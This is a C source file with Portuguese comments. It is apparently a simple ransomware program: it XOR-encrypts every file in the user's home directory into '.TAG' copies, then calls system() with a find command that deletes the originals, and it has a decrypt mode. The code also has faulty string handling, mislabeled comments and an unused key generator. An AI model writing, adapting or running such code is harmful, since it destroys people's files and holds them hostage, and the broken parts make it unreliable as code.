#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <sys/types.h>
#include <dirent.h>
#include <string.h>

int geraChave() {
    srand(time(NULL));
    int secret_key = rand() % 30 + 1985;

    return secret_key;
}

// Encripta os arquivos.
void encriptaArquivo(char * nome, int chave) {
    FILE *f_leitura, *f_escrita;
    char novo_nome[1024];
    strcpy(novo_nome, nome);
    strcat(novo_nome, ".TAG");

    f_leitura = fopen(nome, "r");
    if(f_leitura == NULL) {
        printf("Falha na leitura do arquivo %s.\n", nome);
        exit(-1);
    }
    f_escrita = fopen(novo_nome, "w");

    int get_val;
    // Processo de descriptografia.
    while(get_val = fgetc(f_leitura), get_val != EOF) {
        fputc((char)get_val ^ chave, f_escrita);
    }
    fclose(f_leitura);
    fclose(f_escrita);
}

// Encripta os arquivos.
void decriptaArquivo(char * nome, int chave) {
    FILE *f_leitura, *f_escrita;
    char novo_nome[1024];
    strcpy(novo_nome, nome);

    char *start = strstr(novo_nome, ".TAG");
    char *end = start + strlen(novo_nome)+1;
    strcpy(start, end);

    f_leitura = fopen(nome, "r");
    if(f_leitura == NULL) {
        printf("Falha na leitura do arquivo %s.\n", nome);
        exit(-1);
    }
    f_escrita = fopen(novo_nome, "w");

    int get_val;
    // Processo de descriptografia.
    while(get_val = fgetc(f_leitura), get_val != EOF) {
        fputc((char)get_val ^ chave, f_escrita);
    }
    fclose(f_leitura);
    fclose(f_escrita);
}

int main(int argc, char ** argv) {
    // Verifica se a chave foi passada.
    if(argc < 3) {
        printf("A chave não foi passada. Abortando...\n");
        return 0;
    }

    char * dir_path;
    #ifdef _WIN64
        dir_path = getenv("USERPROFILE");
    #elif _WIN32
        dir_path = getenv("USERPROFILE");
    #elif __linux__
        dir_path = getenv("USER");
    #endif

    // Converte a chave para inteiro.
    int chave = atoi(argv[1]);

    if(dir_path == NULL) {
        fprintf(stderr, "Pasta dos arquivos encriptados não encontrada.\n");
        exit(-1);
    }

    // Abre a pasta de arquivos encriptados.
    DIR *user_dir = opendir(dir_path);
    if(user_dir == NULL) {
        fprintf(stderr,"Error : Falha ao abrir o diretório - %s\n",dir_path);
        exit(-1);
    }

    char arquivo_user [512];

    // Abre os arquivos e executa a criptografia.
    struct dirent * dir_entry;
    while(dir_entry = readdir(user_dir), dir_entry != NULL) {
        int comp = strcmp(dir_entry->d_name, ".");
        if ((comp != 0) && (comp = strcmp(dir_entry->d_name,".."), comp != 0)) {
            // Abre o arquivo encriptado.
            sprintf(arquivo_user, "%s/%s", dir_path, dir_entry->d_name);
            if(strcmp(argv[2], "encr") == 0) {
                encriptaArquivo(arquivo_user, chave);
            } else if(strcmp(argv[2], "decr") == 0) {
                decriptaArquivo(arquivo_user, chave);
            } else {
                printf("Operação sobre arquivos não informada.\n");
                exit(-1);
            }
        }
    }

    if(strcmp(argv[2], "encr") == 0)
        system("find $USER -type f ! -name \'*.TAG\' -delete");
    else if(strcmp(argv[2], "decr") == 0)
        system("find $USER -type f -name \'*.TAG\' -delete");
    return 0;
}
